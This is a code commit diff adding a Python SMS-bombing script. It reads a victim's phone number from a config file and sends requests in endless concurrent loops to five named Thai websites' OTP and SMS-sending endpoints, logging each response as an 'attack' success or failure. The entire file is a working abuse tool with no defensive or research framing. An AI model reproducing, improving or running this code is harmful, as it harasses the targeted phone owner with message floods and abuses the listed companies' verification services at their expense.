4952dc6ff400819977d06a473bcdce3b7bce1914
zxvxzv <114867387+zxvxzv@users.noreply.github.com>
2023-03-24 14:22:23 +0700

    Add files via upload

--- main.py
+++ main.py
@@ -1,31 +1,76 @@
 import asyncio
 import aiohttp
 
-
 with open("config.txt") as file:
     phone = file.read().strip()
 
 phone = ''.join(filter(str.isdigit, phone))
 
+headers = {
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'
+}
 
-async def make_request(session, url):
-    async with session.head(url) as response:
-        if response.status == 200:
-            print("Attack Success Status API : ", response.status)
-        else:
-            print("Attack Fail Status API : ", response.status)
 
-async def loop_request(session, url):
-    while True:
-        await make_request(session, url)
 
-async def main():
+async def api1():
     url = f"https://hdmall.co.th/phone_verifications?mobile={phone}"
     async with aiohttp.ClientSession() as session:
-    	coroutines = [loop_request(session, url) for _ in range(5)]
-    	await asyncio.gather(*coroutines)
+        while True:
+            async with session.get(url) as response:
+                if response.status == 200:
+                    print("API 1 Attack Success Status API : ", response.status)
+                else:
+                    print("API 1 Attack Fail Status API : ", response.status)
+
+async def api2():
+    url = f"https://portal-api.mcloud.co.th/api/v1/otp?phoneNumber={phone}"
+    async with aiohttp.ClientSession() as session:
+        while True:
+            async with session.get(url) as response:
+                if response.status == 200:
+                    print("API 2 Attack Success Status API : ", response.status)
+                else:
+                    print("API 2 Attack Fail Status API : ", response.status)
+                    
+                    
+async def api3():
+    url = "https://www.easymoney.co.th/estimate/actionSendOtp"
+    headers1 = {'content-type': 'application/x-www-form-urlencoded'}
+    async with aiohttp.ClientSession() as session:
+        while True:
+            async with session.post(url, data = {'condition[rakmao]': 'Y','phone': f"{phone}"}, headers=headers1) as response:
+                if response.status == 200:
+                    print("API 3 Attack Success Status API : ", response.status)
+                else:
+                    print("API 3 Attack Fail Status API : ", response.status)
+                    
+                    
+async def api4():
+    url = "https://www.carsome.co.th/website/login/sendSMS"
+    async with aiohttp.ClientSession() as session:
+        while True:
+            async with session.post(url, json={"username": f"{phone}","optType": 0}) as response:
+                if response.status == 200:
+                    print("API 4 Attack Success Status API : ", response.status)
+                else:
+                    print("API 4 Attack Fail Status API : ", response.status)
+                    
+                    
+                    
+async def api5():
+    url = "https://shopgenix.com/api/sms/otp/"
+    async with aiohttp.ClientSession() as session:
+        while True:
+            async with session.post(url, data={"mobile_country_id": "1", "mobile": f"{phone}"}) as response:
+                if response.status == 200:
+                    print("API 5 Attack Success Status API : ", response.status)
+                else:
+                    print("API 5 Attack Fail Status API : ", response.status)
 
 
+
+async def main():
+    await asyncio.gather(api1(), api2(), api3(), api4(), api5())
 
 if __name__ == "__main__":
     asyncio.run(main())
